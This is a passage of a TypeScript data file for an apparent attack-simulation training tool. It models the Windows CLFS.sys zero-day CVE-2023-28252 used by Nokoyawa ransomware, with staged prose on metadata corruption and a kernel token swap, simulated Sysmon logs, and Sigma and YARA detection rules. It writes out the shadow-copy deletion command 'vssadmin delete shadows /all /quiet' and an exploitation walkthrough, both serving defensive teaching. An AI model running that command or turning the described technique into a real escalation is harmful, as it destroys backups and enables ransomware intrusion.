          'Enforce MDM patch compliance via Jamf Pro and block execution of unsigned Mach-O bundles in user-writable directories via Jamf Protect / Santa / Defender.',
      },
    },
  ],
};

export const WINDOWS_CLFS_RANSOMWARE_CVE_2023_28252_NOKOYAWA_SCENARIO: AttackScenario = {
  id: 'windows-clfs-ransomware-cve-2023-28252-nokoyawa',
  code: 'CVE-2023-28252',
  name: 'Kaspersky GReAT & Microsoft — Windows CLFS.sys Kernel Zero-Day EoP & Nokoyawa Ransomware',
  shortSubtitle: 'Kaspersky Securelist · Microsoft MSRC · CVE-2023-28252 · CClfsBaseFilePersisted & ClfsEarlierLsn',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 3,
  overview:
    'Discovered in the wild by Kaspersky GReAT and patched by Microsoft MSRC (April 2023), CVE-2023-28252 (CVSS 7.8) is an actively exploited Windows Common Log File System (CLFS.sys) kernel zero-day Elevation of Privilege vulnerability deployed by Nokoyawa ransomware affiliates. A low-privileged process calls CreateLogFile() to generate a Base Log File (.blf) on disk, corrupts internal CLFS_LOG_BLOCK_HEADER and CClfsBaseFilePersisted metadata offsets while recalculating the CRC32 checksum, and triggers an out-of-bounds kernel write in CClfsBaseFilePersisted::WriteMetadataBlock / ExtendMetadataBlock. By redirecting a fake CClfsContainer virtual function table to kernel gadgets (ClfsEarlierLsn and SeSetAccessStateGenericMapping), the exploit overwrites the current process EPROCESS Token with the SYSTEM Token (PID 4) and launches Nokoyawa ransomware.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Kaspersky GReAT (Securelist) · Microsoft MSRC CVE-2023-28252 · Zscaler ThreatLabz · CISA KEV',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1068 (CLFS.sys Kernel EoP) · T1134.001 (EPROCESS Token Swap) · T1486 (Nokoyawa Ransomware)',
    },
    {
      term: 'KERNEL GADGETS',
      value: 'CLFS!CClfsBaseFilePersisted::WriteMetadataBlock -> Fake CClfsContainer -> CLFS!ClfsEarlierLsn',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'Sysmon EID 11 (C:\\Users\\Public\\*.blf) -> Kernel Token Swap -> nokoyawa.exe (SYSTEM)',
    },
  ],
  nodes: [
    {
      id: 'nokoyawa_eop_loader',
      label: 'clfs_eop.exe (Low-Priv User)',
      sublabel: 'PID 5520 · C:\\Users\\Public\\log.blf',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Nokoyawa Affiliate Privilege Escalation Loader',
        pidOrPort: 'PID 5520 (Medium Integrity Domain User)',
        privilege: 'Standard User -> NT AUTHORITY\\SYSTEM',
        artifacts: [
          'CreateLogFile(L"LOG:C:\\\\Users\\\\Public\\\\log.blf")',
          'Corrupted CLFS_LOG_BLOCK_HEADER.SignaturesOffset + Forged CRC32',
        ],
        description:
          'User-mode exploit binary that creates a Base Log File (.blf), mutates its on-disk metadata offsets, and recalculates its CRC32 checksum.',
      },
    },
    {
      id: 'clfs_sys_kernel_driver',
      label: 'CLFS.sys (Kernel Driver)',
      sublabel: 'CClfsBaseFilePersisted::WriteMetadataBlock',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Windows Common Log File System Driver (C:\\Windows\\System32\\drivers\\clfs.sys)',
        pidOrPort: 'Kernel Ring-0 (CClfsBaseFilePersisted)',
        privilege: 'Kernel Mode (Ring 0)',
        artifacts: [
          'CClfsBaseFilePersisted::ExtendMetadataBlock / WriteMetadataBlock',
          'Out-of-Bounds Write into Fake CClfsContainer Pointer',
        ],
        description:
          'Parses the corrupted .blf metadata block and performs an out-of-bounds write that corrupts a CClfsContainer object pointer.',
      },
    },
    {
      id: 'ntoskrnl_token_swap',
      label: 'ntoskrnl.exe (EPROCESS Token)',
      sublabel: 'ClfsEarlierLsn -> PID 4 SYSTEM Token',
      role: 'memory',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Windows Executive Kernel Pool & EPROCESS Structures',
        pidOrPort: 'PID 4 (System) -> PID 5520 (clfs_eop.exe)',
        privilege: 'Kernel Ring-0 Arbitrary Read/Write',
        artifacts: [
          'Gadgets: CLFS!ClfsEarlierLsn & nt!SeSetAccessStateGenericMapping',
          'EPROCESS(PID 5520).Token overwritten with EPROCESS(PID 4).Token',
        ],
        description:
          'Invokes the fake CClfsContainer vtable pointing to ClfsEarlierLsn to overwrite the exploit process token with the SYSTEM token.',
      },
    },
    {
      id: 'nokoyawa_ransom_exec',
      label: 'nokoyawa.exe (SYSTEM Payload)',
      sublabel: 'ECC secp256k1 + Salsa20 Encryption',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Nokoyawa C++ Ransomware Binary',
        pidOrPort: 'PID 6188 (Spawned as NT AUTHORITY\\SYSTEM)',
        privilege: 'NT AUTHORITY\\SYSTEM',
        artifacts: [
          'C:\\Users\\Public\\nokoyawa.exe --config base64',
          'vssadmin.exe delete shadows /all /quiet & NOKOYAWA-README.txt',
        ],
        description:
          'Launched by the elevated clfs_eop.exe process with full SYSTEM privileges to wipe shadow copies and encrypt enterprise files.',
      },
    },
    {
      id: 'kaspersky_defender_siem',
      label: 'Kaspersky GReAT & Defender EDR',
      sublabel: 'PDM:Exploit.Win32.Generic & Sysmon EID 11',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise EDR & Kernel Telemetry Sensor',
        pidOrPort: 'Sysmon EID 1/11 + Kernel ETW',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Kaspersky Verdict: HEUR:Trojan.Win64.Nokoyawa / CVE-2023-28252',
          'Alert on .blf creation in C:\\Users\\Public\\ followed by SYSTEM spawn',
        ],
        description:
          'Detects anomalous .blf file creation in user-writable folders, CLFS pool manipulation, and SYSTEM token elevation.',
      },
    },
  ],
  processTree: [
    {
      pid: 5520,
      ppid: 4100,
      name: 'clfs_eop.exe',
      commandLine: 'C:\\Users\\Public\\clfs_eop.exe',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'CreateLogFile(L"LOG:C:\\\\Users\\\\Public\\\\log.blf")',
        'AddLogContainer() -> CLFS!CClfsBaseFilePersisted::WriteMetadataBlock',
        'NtQuerySystemInformation(SystemModuleInformation) -> Token Swap',
      ],
      memoryBlocks: [
        {
          address: '0xFFFFF80541920000',
          section: 'CLFS.sys Kernel Pool (CClfsBaseFilePersisted)',
          permissions: 'RW-',
          size: '64 KB',
          status: 'patched',
          description:
            'Corrupted CLFS metadata block and fake CClfsContainer vtable redirecting kernel execution to ClfsEarlierLsn.',
          hexPreview: '43 6C 66 73 45 61 72 6C 69 65 72 4C 73 6E 00 00',
        },
      ],
    },
    {
      pid: 6188,
      ppid: 5520,
      name: 'nokoyawa.exe',
      commandLine: 'C:\\Users\\Public\\nokoyawa.exe --config eyJleHQiOiIubm9rb3lhd2EifQ==',
      user: 'NT AUTHORITY\\SYSTEM',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: [
        'CreateProcessW (User: NT AUTHORITY\\SYSTEM)',
        'vssadmin.exe delete shadows /all /quiet',
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'Malformed Base Log File (.blf) Creation & CRC32 Forgery',
      subtitle: 'Staging a Corrupted CLFS_LOG_BLOCK_HEADER With Valid Checksum on Disk',
      description:
        'The low-privileged exploit process (clfs_eop.exe, PID 5520) calls CreateLogFile() to generate C:\\Users\\Public\\log.blf, modifies CLFS_LOG_BLOCK_HEADER.SignaturesOffset and CLFS_BASE_RECORD_HEADER.rgClients offsets on disk, and recalculates the CRC32 checksum so CLFS.sys accepts the corrupted metadata block.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1068',
      mitreTechniqueName: 'Exploitation for Privilege Escalation (CVE-2023-28252)',
      activeNodeIds: ['nokoyawa_eop_loader', 'clfs_sys_kernel_driver'],
      compromisedNodeIds: ['clfs_sys_kernel_driver'],
      keySpecs: [
        { term: 'WIN32 API', value: 'CreateLogFile(L"LOG:C:\\\\Users\\\\Public\\\\log.blf")' },
        { term: 'CORRUPTED OFFSETS', value: 'CLFS_LOG_BLOCK_HEADER.SignaturesOffset & rgClients' },
        { term: 'CHECKSUM BYPASS', value: 'Recalculated CRC32 in CLFS_LOG_BLOCK_HEADER.Checksum' },
      ],
    },
    {
      index: 2,
      title: 'CClfsBaseFilePersisted::WriteMetadataBlock OOB Write & ClfsEarlierLsn Gadget',
      subtitle: 'Hijacking a Fake CClfsContainer Vtable to Swap EPROCESS Token With PID 4',
      description:
        'Calling AddLogContainer() triggers CClfsBaseFilePersisted::WriteMetadataBlock, which uses the corrupted offset to overwrite a kernel pointer with a fake pContainer vtable pointing to ClfsEarlierLsn and SeSetAccessStateGenericMapping, achieving arbitrary kernel write to swap the process EPROCESS Token with PID 4 (SYSTEM).',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1134.001',
      mitreTechniqueName: 'Access Token Manipulation: Token Impersonation/Theft (EPROCESS)',
      activeNodeIds: ['nokoyawa_eop_loader', 'clfs_sys_kernel_driver', 'ntoskrnl_token_swap'],
      compromisedNodeIds: ['clfs_sys_kernel_driver', 'ntoskrnl_token_swap'],
      keySpecs: [
        { term: 'VULNERABLE FUNCTION', value: 'CLFS!CClfsBaseFilePersisted::WriteMetadataBlock' },
        { term: 'KERNEL GADGETS', value: 'CLFS!ClfsEarlierLsn & nt!SeSetAccessStateGenericMapping' },
        { term: 'TOKEN OVERWRITE', value: 'EPROCESS(PID 5520).Token = EPROCESS(PID 4).Token' },
      ],
    },
    {
      index: 3,
      title: 'SYSTEM Privilege Escalation & Nokoyawa Ransomware Execution',
      subtitle: 'Spawning nokoyawa.exe Under NT AUTHORITY\\SYSTEM to Encrypt Host',
      description:
        'Now running with the NT AUTHORITY\\SYSTEM token, clfs_eop.exe spawns nokoyawa.exe to delete Volume Shadow Copies and encrypt enterprise files using ECC secp256k1 + Salsa20.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1486',
      mitreTechniqueName: 'Data Encrypted for Impact (Nokoyawa Ransomware)',
      activeNodeIds: ['ntoskrnl_token_swap', 'nokoyawa_ransom_exec', 'kaspersky_defender_siem'],
      compromisedNodeIds: ['clfs_sys_kernel_driver', 'ntoskrnl_token_swap', 'nokoyawa_ransom_exec'],
      keySpecs: [
        { term: 'ELEVATED CONTEXT', value: 'NT AUTHORITY\\SYSTEM' },
        { term: 'RANSOMWARE PAYLOAD', value: 'nokoyawa.exe (ECC secp256k1 + Salsa20)' },
        { term: 'DISCOVERY CREDIT', value: 'Kaspersky GReAT (Securelist) / Microsoft MSRC' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'clfs-28252-1',
      no: 1,
      stageIndex: 1,
      timestamp: '03:18:44.105',
      sourceNodeId: 'nokoyawa_eop_loader',
      targetNodeId: 'clfs_sys_kernel_driver',
      sourceLabel: 'clfs_eop.exe (PID 5520)',
      targetLabel: 'CLFS.sys (log.blf.blf)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 11 (FileCreate)',
      shortAction: 'CRAFTED .BLF CREATED',
      info: 'CreateLogFile generates C:\\Users\\Public\\log.blf.blf followed by direct raw offset corruption & CRC32 update',
      sizeOrCode: '64 KB (.blf)',
      severity: 'HIGH',
      mitreId: 'T1068',
      explanation:
        'Low-privileged exploit binary creates a Base Log File (.blf) in C:\\Users\\Public\\ and corrupts its metadata offsets to stage CVE-2023-28252.',
      rawLog: `EventID: 11 (FileCreate)
Image: C:\\Users\\Public\\clfs_eop.exe
ProcessId: 5520
TargetFilename: C:\\Users\\Public\\log.blf.blf
CreationUtcTime: 2023-02-28 03:18:44.105
[CLFS_PARSE] SignaturesOffset=0x1480 (Corrupted) CRC32=0x9A4F812C (Valid)`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Suspicious CLFS Base Log File (.blf) Created in User-Writable Directory',
        ruleCode: `title: Windows CLFS.sys Exploit Base Log File Creation (CVE-2023-28252)
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|endswith: '.blf'
    TargetFilename|contains:
      - 'C:\\Users\\Public\\'
      - '\\AppData\\Local\\Temp\\'
      - 'C:\\Windows\\Temp\\'
  condition: selection
level: high`,
        mitigation:
          'Apply the April 2023 Windows security update for CLFS.sys (CVE-2023-28252) and monitor .blf file creation outside standard system logging paths.',
      },
    },
    {
      id: 'clfs-28252-2',
      no: 2,
      stageIndex: 2,
      timestamp: '03:18:44.490',
      sourceNodeId: 'clfs_sys_kernel_driver',
      targetNodeId: 'ntoskrnl_token_swap',
      sourceLabel: 'CLFS.sys (Ring 0)',
      targetLabel: 'ntoskrnl.exe (EPROCESS)',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'Kernel ETW / Token Check',
      shortAction: 'EPROCESS TOKEN SWAP',
      info: 'CClfsBaseFilePersisted::WriteMetadataBlock -> Fake CClfsContainer -> ClfsEarlierLsn overwrites PID 5520 Token with SYSTEM',
      sizeOrCode: 'Token=SYSTEM (PID 4)',
      severity: 'CRITICAL',
      mitreId: 'T1134.001',
      explanation:
        'Out-of-bounds write in CClfsBaseFilePersisted hijacks a fake CClfsContainer vtable and replaces the current process token with the SYSTEM token.',
      rawLog: `[KERNEL_MEMORY_ANOMALY] Driver="clfs.sys" Function="CClfsBaseFilePersisted::WriteMetadataBlock"
Fake_pContainer="0x0000021000401000" Gadget="CLFS!ClfsEarlierLsn"
Target_EPROCESS="0xFFFFB20488142080 (PID 5520 clfs_eop.exe)"
Old_Token="Medium Integrity (CORP\\svc_backup)" -> New_Token="NT AUTHORITY\\SYSTEM (Copied from PID 4)"`,
      detectionRule: {
        type: 'YARA',
        title: 'Kaspersky GReAT YARA Rule for CVE-2023-28252 CLFS Exploit Binary',
        ruleCode: `rule Win64_Exploit_CLFS_CVE_2023_28252_Nokoyawa {
  meta:
    author = "Kaspersky GReAT / Microsoft MSRC Synthesis"
    cve = "CVE-2023-28252"
  strings:
    $api1 = "CreateLogFile" ascii wide
    $api2 = "AddLogContainer" ascii wide
    $sym1 = "ClfsEarlierLsn" ascii
    $sym2 = "SeSetAccessStateGenericMapping" ascii
  condition:
    uint16(0) == 0x5a4d and all of them
}`,
        mitigation:
          'Enable HVCI / Memory Integrity and Kernel Data Protection where supported to prevent user-mode vtable pivoting.',
      },
    },
    {
      id: 'clfs-28252-3',
      no: 3,
      stageIndex: 3,
      timestamp: '03:18:45.112',
      sourceNodeId: 'ntoskrnl_token_swap',
      targetNodeId: 'nokoyawa_ransom_exec',
      sourceLabel: 'clfs_eop.exe (SYSTEM)',
      targetLabel: 'nokoyawa.exe (PID 6188)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1 (ProcessCreate)',
      shortAction: 'NOKOYAWA RANSOMWARE',
      info: 'Elevated clfs_eop.exe spawns nokoyawa.exe as NT AUTHORITY\\SYSTEM to delete shadow copies and encrypt files',
      sizeOrCode: 'PID 6188 (SYSTEM)',
      severity: 'CRITICAL',
      mitreId: 'T1486',
      explanation:
        'Following the CLFS kernel token swap, the exploit launches the Nokoyawa ransomware payload under NT AUTHORITY\\SYSTEM.',
      rawLog: `EventID: 1 (Process Create)
ParentImage: C:\\Users\\Public\\clfs_eop.exe (PID 5520)
Image: C:\\Users\\Public\\nokoyawa.exe (PID 6188)
CommandLine: C:\\Users\\Public\\nokoyawa.exe --config eyJleHQiOiIubm9rb3lhd2EifQ==
User: NT AUTHORITY\\SYSTEM
IntegrityLevel: System`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Nokoyawa Ransomware Execution Following CLFS Privilege Escalation',
        ruleCode: `title: Privilege Escalation Binary in Public Folder Spawning SYSTEM Process
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|startswith: 'C:\\Users\\Public\\'
    User|contains:
      - 'AUTHORITY\\SYSTEM'
      - 'AUTORI'
  condition: selection
level: critical`,
        mitigation:
          'Isolate the host immediately, block execution from C:\\Users\\Public\\ via AppLocker/WDAC, and patch CVE-2023-28252.',
      },
    },
  ],
};

export const APT_BATCH4_ENTERPRISE_OS_ZERODAYS_SCENARIOS: AttackScenario[] = [
  ATLASSIAN_CONFLUENCE_CVE_2023_22515_STORM0062_SCENARIO,
  APACHE_ACTIVEMQ_CVE_2023_46604_OPENWIRE_SCENARIO,
  PAPERCUT_NG_CVE_2023_27350_BL00DY_SCENARIO,
  MACOS_GATEKEEPER_ACHILLES_CVE_2022_42821_SCENARIO,
  WINDOWS_CLFS_RANSOMWARE_CVE_2023_28252_NOKOYAWA_SCENARIO,
];
